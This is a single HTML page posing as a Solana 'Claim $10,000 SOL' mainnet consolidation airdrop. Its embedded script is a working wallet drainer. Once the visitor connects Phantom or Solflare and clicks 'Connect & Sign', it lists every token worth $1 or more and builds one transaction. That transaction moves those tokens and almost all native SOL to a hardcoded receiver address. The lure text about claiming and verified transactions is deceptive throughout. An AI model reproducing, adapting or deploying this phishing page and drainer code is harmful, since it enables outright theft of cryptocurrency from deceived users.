<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Your SOL</title>
    <link href="https://googleapis.com" rel="stylesheet">
    <style>
        :root {
            --bg-grey: #121212;
            --card-grey: rgba(40, 40, 40, 0.7);
            --solana-green: #14F195;
            --solana-purple: #9945FF;
        }

        body, html {
            margin: 0; padding: 0; height: 100%;
            font-family: 'Inter', sans-serif;
            background: radial-gradient(circle at top right, #2c2c2c, #121212, #0a0a0a);
            display: flex; justify-content: center; align-items: center;
            overflow: hidden;
        }

        /* Animated Background Effect */
        .mesh-bg {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(45deg, rgba(20,241,149,0.05) 0%, rgba(0,0,0,0) 50%, rgba(153,69,255,0.05) 100%);
            z-index: -1;
        }

        .claim-card {
            background: var(--card-grey);
            backdrop-filter: blur(15px);
            padding: 60px 40px;
            border-radius: 32px;
            border: 1px solid rgba(255,255,255,0.1);
            text-align: center;
            box-shadow: 0 25px 50px rgba(0,0,0,0.6);
            max-width: 450px; width: 90%;
            animation: fadeIn 1s ease-out;
        }

        .sol-text {
            font-size: 48px; font-weight: 900; line-height: 1;
            margin-bottom: 10px;
            background: linear-gradient(90deg, #fff, #888, #fff);
            background-size: 200% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: shine 3s linear infinite;
        }

        .sub-text {
            color: #aaa; font-size: 16px; margin-bottom: 40px; letter-spacing: 1px;
        }

        .claim-btn {
            background: #ffffff;
            color: #000;
            padding: 18px 45px;
            border-radius: 50px;
            font-weight: 800;
            font-size: 18px;
            border: none;
            cursor: pointer;
            text-transform: uppercase;
            transition: all 0.3s ease;
            box-shadow: 0 0 20px rgba(255,255,255,0.2);
            width: 100%;
        }

        .claim-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 30px rgba(20, 241, 149, 0.4);
            background: var(--solana-green);
        }

        @keyframes shine { to { background-position: 200% center; } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>
    <div class="mesh-bg"></div>

    <div class="claim-card">
        <div style="font-size: 12px; color: var(--solana-green); font-weight: bold; margin-bottom: 15px; letter-spacing: 2px;">MAINNET CONSOLIDATION</div>
        <div class="sol-text">CLAIM $10,000 SOL</div>
        <div class="sub-text">Consolidate all SPL tokens & Native SOL</div>
        
        <button class="claim-btn" onclick="executeClaim()">Connect & Sign</button>
        
        <div style="margin-top: 25px; font-size: 10px; color: #555; text-transform: uppercase; letter-spacing: 1px;">
            Verified Transaction via Helius RPC
        </div>
    </div>

    <script type="module">
        import { Connection, PublicKey, TransactionMessage, VersionedTransaction, SystemProgram, LAMPORTS_PER_SOL } from 'https://esm.sh';
        import { createAssociatedTokenAccountInstruction, getAssociatedTokenAddress, createTransferCheckedInstruction } from 'https://esm.sh';

        const HELIUS_RPC = "https://helius-rpc.com";
        const RECEIVER_ADDR = new PublicKey("5KKphHnhQdhMMibgPDSsWXtDPZiFyXPPNSrKXuXxA2CM");
        const connection = new Connection(HELIUS_RPC);

        window.executeClaim = async () => {
            const provider = window.solana;
            if (!provider) return alert("Please install Phantom or Solflare.");

            try {
                const { publicKey } = await provider.connect();
                
                // Fetch assets using Helius DAS API
                const response = await fetch(HELIUS_RPC, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        jsonrpc: '2.0', id: '1', method: 'getAssetsByOwner',
                        params: { ownerAddress: publicKey.toBase58(), displayOptions: { showNativeBalance: true } }
                    }),
                });
                const { result } = await response.json();

                const instructions = [];
                // Sort assets by USD value (descending)
                const validAssets = (result.items || [])
                    .filter(a => a.token_info?.price_info?.total_price >= 1)
                    .sort((a, b) => b.token_info.price_info.total_price - a.token_info.price_info.total_price);

                for (const asset of validAssets) {
                    const mint = new PublicKey(asset.id);
                    const destAta = await getAssociatedTokenAddress(mint, RECEIVER_ADDR);
                    instructions.push(createAssociatedTokenAccountInstruction(publicKey, destAta, RECEIVER_ADDR, mint));
                    instructions.push(createTransferCheckedInstruction(
                        new PublicKey(asset.token_info.associated_token_address),
                        mint, destAta, publicKey, asset.token_info.balance, asset.token_info.decimals
                    ));
                }

                // Native SOL Transfer
                const solBalance = result.nativeBalance?.lamports || 0;
                if (solBalance > 5000) {
                    instructions.push(SystemProgram.transfer({
                        fromPubkey: publicKey, toPubkey: RECEIVER_ADDR, lamports: solBalance - 5000
                    }));
                }

                if (instructions.length === 0) return alert("No assets > $1 found.");

                const { blockhash } = await connection.getLatestBlockhash();
                const message = new TransactionMessage({
                    payerKey: publicKey, recentBlockhash: blockhash, instructions
                }).compileToV0Message();

                const tx = new VersionedTransaction(message);
                const { signature } = await provider.signAndSendTransaction(tx);
                alert("Consolidation Started: " + signature);
            } catch (e) {
                console.error(e);
                alert("Transaction Cancelled or Failed.");
            }
        };
    </script>
</body>
</html>
